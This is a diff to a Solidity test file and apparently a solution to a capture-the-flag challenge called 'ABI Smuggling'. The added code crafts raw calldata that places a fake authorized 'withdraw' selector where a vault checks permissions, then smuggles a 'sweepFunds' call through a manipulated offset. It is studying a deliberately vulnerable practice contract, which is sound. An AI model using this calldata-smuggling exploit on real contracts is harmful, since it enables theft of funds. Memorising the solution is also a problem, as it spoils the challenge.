@@ -73,7 +73,43 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
+        // 1. Prepare data for the real action (sweepFunds)
+        bytes memory sweepData = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            address(token)
+        );
+
+        // 2. Construct the malicious calldata
+        //
+        // Structure we want:
+        // 0x00: execute selector
+        // 0x04: target address (vault)
+        // 0x24: offset of actionData (pointer)
+        // ... (padding to reach offset 0x64) ...
+        // 0x64: FAKE selector (withdraw) - Checked by authorized executor
+        // ... (more padding/structure to reach actionData start) ...
+        // 0x84: length of actionData
+        // 0xA4: actual actionData (sweepFunds)
+
+        // Calculate offset:
+        // Standard offset is 0x40 (64 bytes from start of args).
+        // We want to insert 32 bytes (padding) + 32 bytes (fake selector) before the length.
+        // So offset = 0x40 + 0x40 = 0x80 (128).
         
+        bytes memory payload = abi.encodePacked(
+            vault.execute.selector,                         // 0x00
+            bytes32(uint256(uint160(address(vault)))),      // 0x04: Target
+            bytes32(uint256(0x80)),                         // 0x24: Offset to actionData (128)
+            bytes32(0),                                     // 0x44: Padding
+            bytes32(abi.encodePacked(vault.withdraw.selector, bytes28(0))), // 0x64: Fake Selector (withdraw)
+            bytes32(uint256(sweepData.length)),             // 0x84: Length of actionData
+            sweepData                                       // 0xA4: Actual data (sweepFunds)
+        );
+
+        // 3. Execute the exploit
+        (bool success, ) = address(vault).call(payload);
+        require(success, "Exploit failed");
     }
 
     /**
